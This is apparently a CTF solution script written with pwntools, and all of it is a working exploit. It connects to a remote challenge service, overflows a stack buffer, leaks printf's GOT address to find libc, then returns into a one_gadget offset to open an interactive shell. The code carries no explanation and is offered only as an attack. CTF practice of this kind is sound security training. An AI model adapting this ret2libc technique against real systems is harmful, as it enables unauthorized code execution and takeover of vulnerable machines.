from pwn import *

#p = process('./pwning')
p = remote('ctf.j0n9hyun.xyz', 3019)
e = ELF('./pwning')
pause()
context.log_level = "debug"

main = 0x080485B8
syscall = 0x80484D0
p_ebx_r = 0x0804835d

p.recv()
p.sendline('-1')

payload = 'a' * 0x2c + 'b' * 4

payload += p32(e.plt['printf'])
payload += p32(main)
payload += p32(e.got['printf'])

p.sendline(payload)

p.recvuntil('\x08\x0a')

libc = u32(p.recv(4)) - 0x00049020


log.info('libc : ' + hex(libc))
p.recv()
p.sendline('-1')
p.recv()

payload = 'a' * 0x2c + 'b' * 4
payload += p32(libc + 0x3a812)

p.sendline(payload)

p.interactive()
